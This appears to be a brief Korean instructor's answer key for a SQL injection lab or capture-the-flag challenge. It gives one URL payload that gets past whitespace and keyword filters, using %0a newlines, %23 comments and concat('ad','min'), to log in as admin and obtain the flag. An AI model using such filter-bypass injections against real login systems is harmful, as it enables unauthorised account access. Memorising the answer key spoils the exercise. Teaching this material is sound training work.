# [강사용] SQLi #2
`/?userid=a'='a'%23%0aand%23%0auserid=concat('ad','min')%23&userpw=x` → admin → flag. (공백=%0a, admin=concat 우회)
